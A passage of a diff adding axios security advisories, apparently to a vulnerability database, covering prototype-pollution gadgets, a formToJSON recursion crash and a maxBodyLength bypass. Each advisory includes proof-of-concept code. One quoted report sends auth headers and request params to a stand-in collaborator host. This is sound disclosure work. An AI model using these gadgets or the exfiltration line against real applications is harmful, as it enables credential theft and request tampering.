paramsSerializer: {},\n    params: { unused: 'ignored' }\n  });\n\n  console.log(response.data);\n} finally {\n  await new Promise((resolve) => server.close(resolve));\n  delete Object.prototype.username;\n  delete Object.prototype.password;\n  delete Object.prototype.serialize;\n}\n```\n\nObserved result:\n\n```json\n{\n  \"authorization\": \"Basic YXR0YWNrZXI6ZXhmaWw=\",\n  \"url\": \"/demo?polluted=1\"\n}\n```\n\n## Workarounds\n\nIf upgrading is not yet possible, avoid passing placeholder nested option objects.\n\nRemove `auth` entirely when Basic auth is not intended. For `paramsSerializer` objects, provide explicit own `encode` and `serialize` properties or remove `paramsSerializer` when custom serialization is not required.\n\nThese workarounds only address this axios gadget. They do not remediate the separate prototype-pollution primitive that must already exist in the application process.\n\n<details>\n<summary>Original Report</summary>\n\n### Summary\naxios 1.16.1 mitigates prototype-pollution gadgets on the top-level request config but not on nested option objects. When a caller passes a partial nested option object such as auth: {} or paramsSerializer: {}, axios reads inner fields (username, password, encode, serialize) through the prototype chain. If Object.prototype has been polluted by another component in the same Node.js process, those inherited values are silently injected into the outbound request, including the Authorization header and the serialized query string. \n\n### Details\nmergeConfig (lib/core/mergeConfig.js) was hardened to use a null-prototype container for the top-level config, but its nested-clone helper still produces ordinary {} containers:\n\nmergeConfig.js Lines 36-45\n\n```\n  function getMergedValue(target, source, prop, caseless) {\n    if (utils.isPlainObject(target) && utils.isPlainObject(source)) {\n      return utils.merge.call({ caseless }, target, source);\n    } else if (utils.isPlainObject(source)) {\n      return utils.merge({}, source);\n    } else if (utils.isArray(source)) {\n      return source.slice();\n    }\n    return source;\n  }\n```\n\nThe cloned nested objects therefore inherit from Object.prototype. Downstream consumers read sensitive fields via plain dotted access, with no own-property guard:\n\nBrowser / fetch Basic auth \u2014 lib/helpers/resolveConfig.js:\nresolveConfig.js Lines 64-70\n```\n  if (auth) {\n    headers.set(\n      'Authorization',\n      'Basic ' +\n        btoa((auth.username || '') + ':' + (auth.password ? encodeUTF8(auth.password) : ''))\n    );\n  }\n```\n\nNode HTTP adapter Basic auth \u2014 lib/adapters/http.js:\nhttp.js Lines 829-836\n```\n      // HTTP basic authentication\n      let auth = undefined;\n      const configAuth = own('auth');\n      if (configAuth) {\n        const username = configAuth.username || '';\n        const password = configAuth.password || '';\n        auth = username + ':' + password;\n      }\n```\n\nparamsSerializer reads \u2014 lib/helpers/buildURL.js:\nbuildURL.js Lines 31-54\n```\nexport default function buildURL(url, params, options) {\n  if (!params) {\n    return url;\n  }\n  const _encode = (options && options.encode) || encode;\n  const _options = utils.isFunction(options)\n    ? {\n        serialize: options,\n      }\n    : options;\n  const serializeFn = _options && _options.serialize;\n  let serializedParams;\n  if (serializeFn) {\n    serializedParams = serializeFn(params, _options);\n  } else {\n    serializedParams = utils.isURLSearchParams(params)\n      ? params.toString()\n      : new AxiosURLSearchParams(params, _options).toString(_encode);\n  }\n```\n\nBecause auth.username, auth.password, options.encode, and options.serialize are accessed without hasOwnProperty checks, a polluted Object.prototype.username / Object.prototype.password / Object.prototype.serialize flows directly into the outgoing request.\n\nThe auth sink is the primary impact (silent Basic-auth injection); paramsSerializer.serialize is a secondary but powerful sink because it can fully replace the query string.\n\n### PoC\n```\nimport http from 'node:http';\nimport axios from '../../index.js';\n\nconst ATTACKER_USER = 'attacker';\nconst ATTACKER_PASS = 'exfil';\nconst ATTACKER_BASIC = Buffer.from(`${ATTACKER_USER}:${ATTACKER_PASS}`).toString('base64');\n\n// Step 1: simulate a pre-existing prototype-pollution primitive in this process.\n// In reality, a separate dependency would have done this. We keep the\n// \"polluted\" properties non-enumerable so they only affect inherited reads,\n// which is the realistic shape of most prototype-pollution gadgets.\nObject.defineProperty(Object.prototype, 'username', {\n  value: ATTACKER_USER,\n  configurable: true,\n});\nObject.defineProperty(Object.prototype, 'password', {\n  value: ATTACKER_PASS,\n  configurable: true,\n});\nObject.defineProperty(Object.prototype, 'serialize', {\n  value: () => 'polluted=1',\n  configurable: true,\n});\n\n// Local capture server.\nconst server = http.createServer((req, res) => {\n  const captured = {\n    authorization: req.headers['authorization'] || null,\n    url: req.url,\n  };\n  res.writeHead(200, { 'content-type': 'application/json' });\n  res.end(JSON.stringify(captured));\n});\n\nawait new Promise((resolve) => server.listen(0, '127.0.0.1', resolve));\nconst port = server.address().port;\n\ntry {\n  // Application code: passes nested *placeholder* option objects that have\n  // no own auth/serializer properties. Without prototype pollution this is\n  // a no-op. With prototype pollution it becomes attacker-controlled state.\n  const response = await axios.get(`http://127.0.0.1:${port}/demo`, {\n    auth: {},\n    paramsSerializer: {},\n    params: { unused: 'ignored-by-polluted-serializer' },\n  });\n\n  console.log('--- PoC: nested-option prototype-pollution gadgets ---');\n  console.log('Server saw:', JSON.stringify(response.data));\n\n  const authLeaked = response.data.authorization === `Basic ${ATTACKER_BASIC}`;\n  const urlRewritten = response.data.url === '/demo?polluted=1';\n\n  if (authLeaked && urlRewritten) {\n    console.log(\n      'VULNERABLE: nested auth + paramsSerializer inherited polluted ' +\n        'Object.prototype values into the outbound request.'\n    );\n    process.exitCode = 0;\n  } else {\n    console.log('NOT VULNERABLE: nested option objects did not leak prototype state.');\n    console.log('  authLeaked   =', authLeaked);\n    console.log('  urlRewritten =', urlRewritten);\n    process.exitCode = 1;\n  }\n} finally {\n  server.close();\n  // Restore Object.prototype so a noisy exit/process state cannot affect\n  // anything else accidentally sharing the runtime.\n  delete Object.prototype.username;\n  delete Object.prototype.password;\n  delete Object.prototype.serialize;\n}\n```\n\n### Impact\nConcrete consequences:\n- Silent injection of attacker-controlled Authorization: Basic \u2026 headers on outbound requests, enabling credential exfiltration to attacker-chosen upstreams or impersonation against trusted upstreams.\n- Full takeover of query-string serialization via paramsSerializer.serialize, enabling request tampering, cache-key poisoning, and bypass of upstream signature/policy checks that sign the literal request line.\n<details>",
+                info: [
+                  "https://github.com/axios/axios/security/advisories/GHSA-7q8q-rj6j-mhjq",
+                  "https://github.com/axios/axios/pull/11000",
+                  "https://github.com/axios/axios/pull/11001",
+                  "https://github.com/axios/axios/commit/1417285c69344bbcc6420a021f67dee0c6fedb2d",
+                  "https://github.com/axios/axios/commit/32fc489632377d214db55bfa4e2c48486a7d7ce2",
+                  "https://github.com/axios/axios/releases/tag/v0.33.0",
+                  "https://github.com/axios/axios/releases/tag/v1.18.0"
+                ]
+              },
+              {
+                atOrAbove: "1.0.0",
+                below: "1.18.0",
+                severity: "medium",
+                cwe: [
+                  "CWE-1321"
+                ],
+                identifiers: {
+                  summary: "Axios: Prototype pollution gadgets can alter axios request construction",
+                  githubID: "GHSA-mmx7-hfxf-jppx",
+                  CVE: [
+                    "CVE-2026-67316"
+                  ]
+                },
+                details: "## Summary\n\naxios is vulnerable to read-side prototype-pollution gadgets when `Object.prototype` has already been polluted by another vulnerability or dependency. The most broadly reachable issue is in the bodyless method aliases: `axios.get()`, `axios.delete()`, `axios.head()`, and `axios.options()` read inherited `data` before config normalization, causing attacker-controlled body data to be sent on requests that did not explicitly set a body.\n\nAdditional low-level paths affect consumers that call exported adapters/helpers directly with plain config objects. In those cases, inherited `proxy` or `paramsSerializer` values can influence request routing or URL serialization. These low-level paths are not reproduced through normal `axios.get()` usage on `1.15.2+`.\n\n## Impact\n\nAn attacker who can first pollute `Object.prototype` can cause axios to send attacker-controlled request bodies on bodyless method aliases. This can corrupt request semantics where the receiving service processes bodies on `GET`, `DELETE`, `HEAD`, or `OPTIONS`.\n\nFor direct low-level Node HTTP adapter usage, inherited `proxy` can route requests through an attacker-controlled proxy. Depending on axios version, target scheme, and proxy behavior, this can expose request URLs, headers, and bodies or allow traffic modification.\n\nFor direct `resolveConfig` or browser-adapter helper usage, inherited `paramsSerializer` can be invoked with request params, allowing attacker-controlled URL serialization. This was not reproduced through normal high-level axios calls on `1.15.2+`.\n\n## Affected Functionality\n\nAffected normal API:\n\n- `axios.get(url[, config])`\n- `axios.delete(url[, config])`\n- `axios.head(url[, config])`\n- `axios.options(url[, config])`\n\nAffected low-level usage:\n\n- Direct calls to `axios/lib/adapters/http.js` or `axios/unsafe/adapters/http.js` with plain configs and no own `proxy`.\n- Direct calls to `axios/unsafe/helpers/resolveConfig.js` or direct browser adapter/helper paths with plain configs and no own `paramsSerializer`.\n\nUnaffected or corrected scope:\n\n- Normal `axios.get()` calls on `1.15.2+` did not reproduce the `proxy` or `paramsSerializer` gadgets because `mergeConfig()` returns a null-prototype config and uses own-property reads.\n\n## Technical Details\n\n`lib/core/Axios.js` constructs aliases for bodyless methods and copies `data` with `(config || {}).data` before config normalization. If `Object.prototype.data` is polluted, this inherited value becomes an own `data` property in the merged request config and is sent by the adapter.\n\n`lib/core/mergeConfig.js` in `1.15.2+` returns a null-prototype config and uses `hasOwnProp` guards, which prevents normal high-level requests from inheriting polluted `proxy` and `paramsSerializer` values after merge. This is why those two reporter claims do not reproduce through normal `axios.get()` on `1.15.2` or `1.16.1`.\n\nThe low-level adapter/helper paths can still receive plain configs directly. In that usage, direct reads of `config.proxy` in the Node HTTP adapter and `config.paramsSerializer` in affected `resolveConfig()` versions can consume inherited polluted values.\n\n## Proof of Concept of Attack\n\n```js\nimport http from 'http';\nimport axios from 'axios';\n\nconst server = http.createServer((req, res) => {\n  let body = '';\n\n  req.on('data', chunk => {\n    body += chunk;\n  });\n\n  req.on('end', () => {\n    res.writeHead(200, {'content-type': 'application/json'});\n    res.end(JSON.stringify({body, headers: req.headers}));\n  });\n});\n\nawait new Promise(resolve => server.listen(0, '127.0.0.1', resolve));\n\nObject.prototype.data = 'INJECTED';\n\ntry {\n  const res = await axios.get(`http://127.0.0.1:${server.address().port}/data`);\n\n  console.log(res.data.body); // \"INJECTED\"\n  console.log(res.data.headers['content-length']); // \"8\"\n} finally {\n  delete Object.prototype.data;\n  await new Promise(resolve => server.close(resolve));\n}\n```\n\nExpected result: a request body is sent even though the caller did not explicitly set `config.data`.\n\n## Workarounds\n\nAvoid processing untrusted input with libraries or code paths that can pollute `Object.prototype`. As a defense-in-depth mitigation before an axios fix is available, explicitly pass `data: undefined` on bodyless method aliases when running in a process where prototype pollution is a concern.\n\n<details>\n<summary>Original Report</summary>\n\n### Summary\n\nThree prototype pollution read-side gadgets in axios bypass the `own()` hasOwnProp guard pattern, allowing a polluted `Object.prototype` to hijack outbound requests.\n\n### Details\n\nThe [`own()` helper](https://github.com/axios/axios/blob/v1.15.2/lib/adapters/http.js#L342) was introduced after GHSA-q8qp-cvcw-x6jj to prevent polluted prototype properties from reaching security-sensitive config reads. Three paths were missed:\n\n`config.proxy` at [http.js:715](https://github.com/axios/axios/blob/v1.15.2/lib/adapters/http.js#L715) goes straight into [`setProxy()`](https://github.com/axios/axios/blob/v1.15.2/lib/adapters/http.js#L197). A polluted `Object.prototype.proxy` reroutes outbound requests through an attacker-controlled proxy, exposing Authorization headers and full request URLs.\n\n`(config || {}).data` at [Axios.js:248](https://github.com/axios/axios/blob/v1.15.2/lib/core/Axios.js#L248) covers GET, HEAD, DELETE, OPTIONS. Even without explicit body, polluted value becomes the body. I got injected payloads on 3 of 4 method types in testing.\n\n`config.paramsSerializer` at [resolveConfig.js:32](https://github.com/axios/axios/blob/v1.15.2/lib/helpers/resolveConfig.js#L32) is three lines below the [`own()` definition that was supposed to protect it](https://github.com/axios/axios/blob/v1.15.2/lib/helpers/resolveConfig.js#L15). A polluted  function onto `Object.prototype.paramsSerializer` gets called with the request params on every request that has query strings.\n\nI read up on the threat model and I believe T-R4b identifies this exact class and notes that config-read paths must use `hasOwnProp` guards. These three seem to predate or were missed by that coverage.\n\n### PoC\n\nRan against `axios@1.15.2` on `node:22-slim` in Docker. Clean install, no other deps.\n\n```javascript\nimport axios from 'axios';\n\n// gadget 1 - proxy\nObject.prototype.proxy = { host: 'yourcollab.oastify.com', port: 8080, protocol: 'http' };\nawait axios.get('https://api.example.com/user', { headers: { Authorization: 'Bearer sk-test-1234567890' } });\n// check collaborator - request arrives with full path + auth header\n```\n\n```javascript\n// gadget 2 - data on bodyless methods\nObject.prototype.data = '{\"injected\":true}';\nawait axios.get('https://api.example.com/items');\nawait axios.delete('https://api.example.com/items/1');\nawait axios.head('https://api.example.com/items');\n// 3/4 methods send the polluted body\n```\n\n```javascript\n// gadget 3 - paramsSerializer\nObject.prototype.paramsSerializer = (p) => {\n  fetch('https://yourcollab.oastify.com/?' + new URLSearchParams(p));\n  return 'q=x';\n};\nawait axios.get('https://api.example.com/search', { params: { token: 'secret' } });\n```\n\n### Impact\n\nAny app with a polluted prototype (common via transitive deps like lodash, qs, minimist) should be affected. Gadget 1 steals credentials and redirects traffic. Gadget 2 corrupts request semantics. Gadget 3 gives the attacker arbitrary control over URL construction and a data exfiltration channel. All three fire silently on normal application code that never touches proxy, data, or `paramsSerializer` directly.\n</details>",
+                info: [
+                  "https://github.com/axios/axios/security/advisories/GHSA-mmx7-hfxf-jppx",
+                  "https://github.com/axios/axios/pull/11000",
+                  "https://github.com/axios/axios/pull/11001",
+                  "https://github.com/axios/axios/commit/1417285c69344bbcc6420a021f67dee0c6fedb2d",
+                  "https://github.com/axios/axios/commit/32fc489632377d214db55bfa4e2c48486a7d7ce2",
+                  "https://github.com/axios/axios/releases/tag/v0.33.0",
+                  "https://github.com/axios/axios/releases/tag/v1.18.0"
+                ]
+              },
+              {
+                atOrAbove: "1.0.0",
+                below: "1.18.0",
+                severity: "medium",
+                cwe: [
+                  "CWE-400",
+                  "CWE-770"
+                ],
+                identifiers: {
+                  summary: "Axios: Deep formToJSON Key Recursion Can Cause Denial of Service",
+                  githubID: "GHSA-pmv8-rq9r-6j72",
+                  CVE: [
+                    "CVE-2026-67312"
+                  ]
+                },
+                details: "## Summary\n\nAxios versions starting with `0.28.0` contain uncontrolled recursion in `formDataToJSON`, which is exposed as `axios.formToJSON()` and used internally when axios serialises `FormData` with `Content-Type: application/json`.\n\nIf an application passes attacker-controlled `FormData` field names to this functionality, a field name with thousands of nested bracket segments can exhaust the JavaScript call stack and cause denial of service for that request or, in applications without appropriate error handling, process termination.\n\n## Impact\n\nApplications are affected only when untrusted users can control `FormData` key names that are converted through axios.\n\nAffected paths include direct use of `axios.formToJSON()` on untrusted `FormData` and axios requests in which attacker-controlled `FormData` is sent with `Content-Type: application/json`.\n\nThe observed failure is `RangeError: Maximum call stack size exceeded`. In local testing, this error is catchable, so process-wide crash depends on the consuming application's error handling and runtime behaviour.\n\n## Affected Functionality\n\nAffected functionality:\n- `axios.formToJSON(formData)`\n- Named ESM export `formToJSON`\n- Default `transformRequest` behaviour for `FormData` when `Content-Type` contains `application/json`\n\nUnaffected functionality:\n- Normal multipart `FormData` submission without JSON serialisation\n- `toFormData`, which already enforces a `maxDepth` guard\n- Axios versions `<=0.27.2`, where `formDataToJSON` was not present\n\n## Technical Details\n\nThe vulnerable code is in `lib/helpers/formDataToJSON.js`.\n\n`parsePropPath()` splits a field name such as `a[x][x][x]` into path segments. `buildPath()` then recursively processes one segment per call without enforcing a maximum depth:\n\n```js\nconst result = buildPath(path, value, target[name], index);\n```\n\nA key with thousands of bracket-delimited segments causes thousands of recursive calls and can exceed the JavaScript engine's call stack limit.\n\nRelevant source locations:\n- `lib/helpers/formDataToJSON.js` contains the unbounded recursive `buildPath()`.\n- `lib/axios.js` exposes the helper as `axios.formToJSON`.\n- `index.js` exposes `formToJSON` as a named export.\n- `index.d.ts` and `index.d.cts` declare the public API.\n- `lib/defaults/index.js` calls `formDataToJSON(data)` when JSON-serializing `FormData`.\n\nThe inverse helper, `toFormData`, already enforces `maxDepth` and throws `AxiosError` with `ERR_FORM_DATA_DEPTH_EXCEEDED`, but `formDataToJSON` does not have an equivalent guard.\n\n## Proof of Concept of Attack\n\n```js\nimport axios from 'axios';\n\nconst fd = new FormData();\nfd.append('a' + '[x]'.repeat(15000), 'value');\n\ntry {\n  axios.formToJSON(fd);\n  console.log('not vulnerable');\n} catch (e) {\n  console.log(`${e.constructor.name}: ${e.message}`);\n}\n```\n\nExpected result on affected versions:\n\nRangeError: Maximum call stack size exceeded\n\nThe same condition can be reached via an axios request transformation when attacker-controlled `FormData` is sent with `Content-Type: application/json`.\n\n## Workarounds\nApplications can reject or normalise untrusted form field names before calling `axios.formToJSON()`.\n\nApplications can avoid sending untrusted `FormData` through axios as JSON unless JSON conversion is required.\n\nApplications should catch errors around `formToJSON()` or axios requests that transform untrusted `FormData`.\n\n<details>\n<summary>Original Source</summary>\n\n### Summary\nAn uncontrolled recursion vulnerability in `formDataToJSON` allows any user who controls FormData input to crash a Node.js process with a single request. The function recurses once per bracket-delimited segment in a FormData key name with no depth limit, so a key like `a[x][x][x]...` with 15,000+ segments exhausts the call stack. This is a denial-of-service that kills the process via an unrecoverable `RangeError`. The inverse function `toFormData` already enforces a `maxDepth` limit (default 100) for exactly this reason \u2014 `formDataToJSON` lacks the equivalent guard.\n\n### Details\n**Vulnerable function:** `buildPath` in `lib/helpers/formDataToJSON.js`, lines 50\u201382.\n\n`buildPath(path, value, target, index)` is called recursively \u2014 once per segment in the parsed property path \u2014 with no depth check:\n\n```javascript\n// lib/helpers/formDataToJSON.js, lines 50\u201382\nfunction buildPath(path, value, target, index) {\n  let name = path[index++];              // advance one level\n  if (name === '__proto__') return true;\n  // ...\n  if (!isLast) {\n    // ...\n    const result = buildPath(path, value, target[name], index);  // recurse \u2014 NO depth guard\n    // ...\n  }\n}\n```\n\nThe key is first split into segments by `parsePropPath` (line 17), which extracts every `[segment]` via regex. A key with 15,000 bracket pairs produces a 15,001-element array, causing 15,001 recursive calls \u2014 well beyond the V8 default stack limit (~10,000\u201315,000 frames).\n\n**`formDataToJSON` is a public API** consumed two ways:\n\n1. **Directly by consumers** \u2014 exported as `axios.formToJSON()` (`lib/axios.js:80`), with TypeScript declarations in both `index.d.ts:699` and `index.d.cts:708`, and documented in the API reference in four languages (`docs/pages/advanced/api-reference.md`).\n\n2. **Internally by `transformRequest`** \u2014 called at `lib/defaults/index.js:56` when the request body is `FormData` and `Content-Type` contains `application/json`:\n   ```javascript\n   return hasJSONContentType ? JSON.stringify(formDataToJSON(data)) : data;\n   ```\n\n**Contrast with `toFormData`:** The inverse function (`lib/helpers/toFormData.js:118`) enforces `maxDepth` (default 100) and throws `AxiosError` with code `ERR_FORM_DATA_DEPTH_EXCEEDED` when exceeded. `formDataToJSON` has no equivalent protection.\n\n### PoC\nRequires only Node.js and an unmodified axios v1.x install:\n\n```javascript\nimport formDataToJSON from 'axios/lib/helpers/formDataToJSON.js';\n\n// Build a FormData with a single key containing 15,000 nested bracket segments\nconst fd = new FormData();\nconst key = \"a\" + \"[x]\".repeat(15000);\nfd.append(key, \"value\");\n\ntry {\n  formDataToJSON(fd);\n  console.log(\"Not vulnerable\");\n} catch (e) {\n  console.log(e.constructor.name + \": \" + e.message);\n  // RangeError: Maximum call stack size exceeded\n}\n```\n\nVerified output on Node.js 22.22.3 against axios v1.16.1 (current `v1.x` HEAD):\n\n```\nRangeError: Maximum call stack size exceeded\n```\n\nThe process crashes. In a server context (e.g., Express middleware calling `axios.formToJSON()` on an uploaded form), a single crafted request terminates the process.\n\n### Impact\n**Denial of Service (process crash).** Any unauthenticated user who can submit FormData to a Node.js application that passes it through `axios.formToJSON()` \u2014 or that sends it as a JSON-serialized FormData body via axios \u2014 can crash the server process with a single request. The `RangeError` from stack exhaustion is unrecoverable in many contexts (it cannot be reliably caught when the stack is already full). No authentication or special privileges are required; the attacker only needs to control a FormData key name.\n</details>",
+                info: [
+                  "https://github.com/axios/axios/security/advisories/GHSA-pmv8-rq9r-6j72",
+                  "https://github.com/axios/axios/pull/11000",
+                  "https://github.com/axios/axios/pull/11001",
+                  "https://github.com/axios/axios/commit/1417285c69344bbcc6420a021f67dee0c6fedb2d",
+                  "https://github.com/axios/axios/commit/32fc489632377d214db55bfa4e2c48486a7d7ce2",
+                  "https://github.com/axios/axios/releases/tag/v0.33.0",
+                  "https://github.com/axios/axios/releases/tag/v1.18.0"
+                ]
+              },
+              {
+                atOrAbove: "1.7.0",
+                below: "1.18.0",
+                severity: "medium",
+                cwe: [
+                  "CWE-770"
+                ],
+                identifiers: {
+                  summary: "Axios: Fetch adapter `ReadableStream` uploads bypass `maxBodyLength`",
+                  githubID: "GHSA-jqh4-m9w3-8hp9",
+                  CVE: [
+                    "CVE-2026-67317"
+                  ]
+                },
+                details: "## Summary\n\naxios\u2019 fetch adapter does not enforce `maxBodyLength` for live WHATWG `ReadableStream` request bodies whose size cannot be determined before dispatch. Applications that use `adapter: \"fetch\"` and rely on `maxBodyLength` to cap untrusted upload/proxy streams can send the full stream even when it exceeds the configured limit.\n\nThis affects fetch-adapter usage in edge runtimes where fetch is selected, and in Node.js or browser environments where the fetch adapter is explicitly selected. The HTTP adapter\u2019s stream upload path is not affected.\n\n## Impact\n\nAn attacker who can supply or influence a streamed request body can bypass the caller\u2019s configured upload-size limit. Practical impact is unexpected outbound network egress, request-level resource consumption, and possible exhaustion of upstream API quotas or bandwidth.\n\nThis does not expose response data, execute code, or modify axios configuration. Exploitability depends on an application passing attacker-controlled, unknown-length stream data to axios and relying on `maxBodyLength` as the size guard.\n\n## Affected Functionality\n\nAffected:\n- `adapter: \"fetch\"` or environments where axios selects the fetch adapter.\n- Request methods with bodies, such as `POST`, `PUT`, and `PATCH`.\n- `data` as a WHATWG `ReadableStream` without a reliable `Content-Length`.\n- Configurations that set `maxBodyLength` to a finite value.\n\nNot affected:\n- Axios versions before the fetch adapter was introduced.\n- The Node HTTP adapter stream enforcement path.\n- Known-length fetch-adapter bodies in `1.16.0+`, such as strings, `Blob`, `ArrayBuffer`, `ArrayBufferView`, URLSearchParams, spec-compliant FormData, or requests with a finite `Content-Length`.\n\n## Technical Details\n\nIn `lib/adapters/fetch.js`, `getBodyLength()` handles null bodies, `Blob`, spec-compliant FormData, ArrayBuffer values, URLSearchParams, and strings. It has no branch for `ReadableStream`, so `resolveBodyLength(headers, data)` returns `undefined` when no finite `Content-Length` header is present.\n\nThe `maxBodyLength` check only throws when the resolved outbound length is a finite number greater than the configured limit. For live streams, the check is skipped and the stream is passed to `fetch()`.\n\nWhen `onUploadProgress` is enabled, axios wraps the request body with `trackStream()`, but that wrapper only reports progress. It does not receive `maxBodyLength` and does not abort once loaded bytes exceed the cap.\n\nThe expected behavior exists in the HTTP adapter: `lib/adapters/http.js` enforces `maxBodyLength` for streamed uploads by counting chunks and rejecting with `ERR_BAD_REQUEST`.\n\n## Proof of Concept of Attack\n\nRun from the axios repo root on Node 18+ against an affected version:\n\n```js\nimport http from 'node:http';\nimport axios from './index.js';\n\nconst LIMIT = 1024;\nconst PAYLOAD_BYTES = 2 * 1024 * 1024;\n\nconst server = http.createServer((req, res) => {\n  let received = 0;\n  req.on('data', (chunk) => {\n    received += chunk.length;\n  });\n  req.on('end', () => {\n    res.writeHead(200, { 'content-type': 'application/json' });\n    res.end(JSON.stringify({ received, limit: LIMIT }));\n  });\n});\n\nawait new Promise((resolve) => server.listen(0, '127.0.0.1', resolve));\nconst { port } = server.address();\n\nfunction makeReadableStream(totalBytes) {\n  const chunk = new Uint8Array(64 * 1024).fill(0x42);\n  let remaining = totalBytes;\n\n  return new ReadableStream({\n    pull(controller) {\n      if (remaining <= 0) {\n        controller.close();\n        return;\n      }\n\n      const next = remaining >= chunk.length ? chunk : chunk.subarray(0, remaining);\n      remaining -= next.length;\n      controller.enqueue(next);\n    },\n  });\n}\n\ntry {\n  const response = await axios.post(\n    `http://127.0.0.1:${port}/upload`,\n    makeReadableStream(PAYLOAD_BYTES),\n    {\n      adapter: 'fetch',\n      maxBodyLength: LIMIT,\n      headers: { 'content-type': 'application/octet-stream' },\n    }\n  );\n\n  console.log(response.data);\n} finally {\n  server.close();\n}\n```\n\nExpected vulnerable result: the server reports `received: 2097152` even though `maxBodyLength` is `1024`.\n\n## Workarounds\n\nUse the HTTP adapter for untrusted stream uploads in Node.js where possible, or wrap/count the stream at the application layer and abort it when it exceeds the intended limit. Do not rely on fetch-adapter `maxBodyLength` for unknown-length `ReadableStream` bodies until a fixed axios version is available.\n\n<details>\n<summary>Original Report</summary>\n\n### Summary\naxios's fetch adapter (used in browsers, edge runtimes, and Node 18+ when explicitly selected) ignores maxBodyLength for live ReadableStream request bodies whose size cannot be inferred ahead of dispatch. The pre-dispatch check is skipped when the length is unknown, and the in-flight wrapper that runs during transmission only emits progress events \u2014 it never enforces a byte cap. Severity: medium.\n\n### Details\nIn lib/adapters/fetch.js, body-length resolution has no ReadableStream branch:\n\nfetch.js Lines 121-155\n```\n  const getBodyLength = async (body) => {\n    if (body == null) {\n      return 0;\n    }\n    if (utils.isBlob(body)) {\n      return body.size;\n    }\n    if (utils.isSpecCompliantForm(body)) {\n      const _request = new Request(platform.origin, {\n        method: 'POST',\n        body,\n      });\n      return (await _request.arrayBuffer()).byteLength;\n    }\n    if (utils.isArrayBufferView(body) || utils.isArrayBuffer(body)) {\n      return body.byteLength;\n    }\n    if (utils.isURLSearchParams(body)) {\n      body = body + '';\n    }\n    if (utils.isString(body)) {\n      return (await encodeText(body)).byteLength;\n    }\n  };\n  const resolveBodyLength = async (headers, body) => {\n    const length = utils.toFiniteNumber(headers.getContentLength());\n    return length == null ? getBodyLength(body) : length;\n  };\n```\n\nFor a live ReadableStream, resolveBodyLength returns undefined. The pre-dispatch maxBodyLength check then short-circuits because the value is not finite:\n\nfetch.js Lines 214-232\n```\n      // Enforce maxBodyLength against the outbound request body before dispatch.\n      // Mirrors http.js behavior (ERR_BAD_REQUEST / 'Request body larger than\n      // maxBodyLength limit'). Skip when the body length cannot be determined\n      // (e.g. a live ReadableStream supplied by the caller).\n      if (hasMaxBodyLength && method !== 'get' && method !== 'head') {\n        const outboundLength = await resolveBodyLength(headers, data);\n        if (\n          typeof outboundLength === 'number' &&\n          isFinite(outboundLength) &&\n          outboundLength > maxBodyLength\n        ) {\n          throw new AxiosError(\n            'Request body larger than maxBodyLength limit',\n            AxiosError.ERR_BAD_REQUEST,\n            config,\n            request\n          );\n        }\n      }\n```\n\nThe in-flight stream wrapper that follows is purely for progress reporting; it neither sees maxBodyLength nor aborts the request when bytes exceed any cap:\n\nfetch.js Lines 253-261\n```\n        if (_request.body) {\n          const [onProgress, flush] = progressEventDecorator(\n            requestContentLength,\n            progressEventReducer(asyncDecorator(onUploadProgress))\n          );\n          data = trackStream(_request.body, DEFAULT_CHUNK_SIZE, onProgress, flush);\n        }\n```\nThe body therefore reaches fetch() unbounded, and the entire payload is transmitted regardless of maxBodyLength.\n\n### PoC\n```\nimport http from 'node:http';\nimport axios from '../../index.js';\n\nconst LIMIT = 1024;\nconst PAYLOAD_BYTES = 2 * 1024 * 1024;\n\nconst server = http.createServer((req, res) => {\n  let received = 0;\n  req.on('data', (chunk) => {\n    received += chunk.length;\n  });\n  req.on('end', () => {\n    res.writeHead(200, { 'content-type': 'application/json' });\n    res.end(JSON.stringify({ received, limit: LIMIT }));\n  });\n  req.on('error', () => {\n    /* swallow client-side aborts */\n  });\n});\n\nawait new Promise((resolve) => server.listen(0, '127.0.0.1', resolve));\nconst port = server.address().port;\n\nfunction makeReadableStream(totalBytes) {\n  const CHUNK = new Uint8Array(64 * 1024).fill(0x42);\n  let remaining = totalBytes;\n  return new ReadableStream({\n    pull(controller) {\n      if (remaining <= 0) {\n        controller.close();\n        return;\n      }\n      const next = remaining >= CHUNK.length ? CHUNK : CHUNK.subarray(0, remaining);\n      remaining -= next.length;\n      controller.enqueue(next);\n    },\n  });\n}\n\ntry {\n  let result;\n  try {\n    const response = await axios.post(\n      `http://127.0.0.1:${port}/upload`,\n      makeReadableStream(PAYLOAD_BYTES),\n      {\n        adapter: 'fetch',\n        maxBodyLength: LIMIT,\n        headers: { 'content-type': 'application/octet-stream' },\n        // No content-length: the stream's total length is unknown ahead of\n        // dispatch, which is exactly the vulnerable code path.\n      }\n    );\n    result = { status: response.status, data: response.data };\n  } catch (err) {\n    result = { error: err && (err.code || err.message) };\n  }\n\n  console.log('--- PoC: fetch adapter ReadableStream maxBodyLength bypass ---');\n  console.log('axios result:', JSON.stringify(result));\n\n  const ok =\n    result &&\n    result.status === 200 &&\n    result.data &&\n    typeof result.data === 'object' &&\n    result.data.received === PAYLOAD_BYTES &&\n    result.data.limit === LIMIT;\n\n  if (ok) {\n    console.log(\n      `VULNERABLE: server received ${result.data.received} bytes despite ` +\n        `maxBodyLength=${LIMIT}.`\n    );\n    process.exitCode = 0;\n  } else {\n    console.log('NOT VULNERABLE: axios refused or truncated the oversized ReadableStream.');\n    process.exitCode = 1;\n  }\n} finally {\n  server.close();\n}\n```\n\n### Impact\n- Uncontrolled egress when proxying user-controlled streams (e.g. file uploads, log forwarding, AI streaming endpoints).\n- Bypass of cost / quota guards on upstream APIs.\n- Resource exhaustion against the runtime's network stack and against upstream peers.\n</details>",
+                info: [
+                  "https://github.com/axios/axios/security/advisories/GHSA-jqh4-m9w3-8hp9",
+                  "https://github.com/axios/axios/pull/11000",
+                  "https://github.com/axios/axios/commit/32fc489632377d214db55bfa4e2c48486a7d7ce2",
+                  "https://github.com/axios/axios/releases/tag/v1.18.0"
+                ]
+              },
+              {
+                atOrAbove: "1.13.0",
+                below: "1.18.0",
+                severity: "medium",
+                cwe: [
+                  "CWE-400"
+                ],
+                identifiers: {
+                  summary: "Axios: HTTP/2 streamed uploads bypass `maxBodyLength`",
+                  githubID: "GHSA-mwf2-3pr3-8698",
+                  CVE: [
+                    "CVE-2026-67318"
+                  ]
+                },
